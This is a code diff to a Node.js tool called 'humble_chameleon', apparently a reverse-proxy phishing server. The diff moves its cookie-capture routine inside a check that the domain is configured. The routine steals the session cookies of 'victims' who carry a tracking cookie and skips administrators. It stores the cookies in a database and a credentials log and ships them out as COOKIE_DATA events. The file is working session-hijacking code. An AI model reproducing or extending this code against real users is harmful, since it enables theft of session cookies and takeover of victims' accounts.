@@ -136,40 +136,42 @@ var humble_chameleon = http.createServer(function(victim_request, humble_respons
       victim_cookies = ''
     }
 
-    //check to see if we have some cookies to save in the DB but don't save if it's just an amdin
-    if ((options.headers.cookie != null) && !(options.headers.cookie.includes(admin_config.admin_cookie.cookie_name))) {
-      //create a db entry for it for our admin interface
-      db.serialize(function() {
-        var select = "SELECT cookie FROM cookies WHERE domain = ? AND cookie = ?"
-        db.get(select, [requested_domain, JSON.stringify(victim_cookies)], (err, row) => {
-          if (err) {
-            return console.error(err.message);
-          }
-          //skip the cookie if we already captured it
-          if (row) {
-            //console.log("skipping previously captured cookie")
-	  //only capture cookies for actual victims
-	  } else if(victim_cookies.includes(config[humble_domain].tracking_cookie)){
-            try{
-              let tracking_search = new RegExp(config[humble_domain].tracking_cookie + '=([^;]*)(;|$)', 'i')
-              //get first capture group of our regex
-              tracking_id = tracking_search.exec(victim_cookies)[1]
-              console.log(success + "Captured cookie: " + JSON.stringify(victim_cookies));
-              access_log.write("[+]Captured cookie: " + JSON.stringify(victim_cookies) + "\n");
-              creds_log.write("[+]Captured cookie: " + JSON.stringify(victim_cookies) + "\n");
-              var stmt = db.prepare("INSERT INTO cookies VALUES (?,?,?,?,?)");
-              stmt.run(dateFormat("isoDateTime"),tracking_id,requested_domain,url.parse(victim_request.url).path, JSON.stringify(victim_cookies) )
-              stmt.finalize();
-              ship_logs({"event_ip": victim_request.x_real_ip,"target": tracking_id, "event_type": "COOKIE_DATA", "event_data": JSON.stringify(victim_cookies)})
-	    }catch(err){
-              //console.log(err)
-	      console.log("Error processing tracking cookie: " + victim_cookies)
-	    }
-          }
+    if((typeof config[humble_domain]) != 'undefined'){
+      //check to see if we have some cookies to save in the DB but don't save if it's just an amdin
+      if ((options.headers.cookie != null) && !(options.headers.cookie.includes(admin_config.admin_cookie.cookie_name))) {
+        //create a db entry for it for our admin interface
+        db.serialize(function() {
+          var select = "SELECT cookie FROM cookies WHERE domain = ? AND cookie = ?"
+          db.get(select, [requested_domain, JSON.stringify(victim_cookies)], (err, row) => {
+            if (err) {
+              return console.error(err.message);
+            }
+            //skip the cookie if we already captured it
+            if (row) {
+              //console.log("skipping previously captured cookie")
+  	  //only capture cookies for actual victims
+  	  } else if(victim_cookies.includes(config[humble_domain].tracking_cookie)){
+              try{
+                let tracking_search = new RegExp(config[humble_domain].tracking_cookie + '=([^;]*)(;|$)', 'i')
+                //get first capture group of our regex
+                tracking_id = tracking_search.exec(victim_cookies)[1]
+                console.log(success + "Captured cookie: " + JSON.stringify(victim_cookies));
+                access_log.write("[+]Captured cookie: " + JSON.stringify(victim_cookies) + "\n");
+                creds_log.write("[+]Captured cookie: " + JSON.stringify(victim_cookies) + "\n");
+                var stmt = db.prepare("INSERT INTO cookies VALUES (?,?,?,?,?)");
+                stmt.run(dateFormat("isoDateTime"),tracking_id,requested_domain,url.parse(victim_request.url).path, JSON.stringify(victim_cookies) )
+                stmt.finalize();
+                ship_logs({"event_ip": victim_request.x_real_ip,"target": tracking_id, "event_type": "COOKIE_DATA", "event_data": JSON.stringify(victim_cookies)})
+  	    }catch(err){
+                //console.log(err)
+  	      console.log("Error processing tracking cookie: " + victim_cookies)
+  	    }
+            }
+          });
         });
-      });
+      }
     }
-
+  
     try {
       var admin = options.headers.cookie.includes(admin_config.admin_cookie.cookie_name + "=" + admin_config.admin_cookie.cookie_value)
       if(admin){
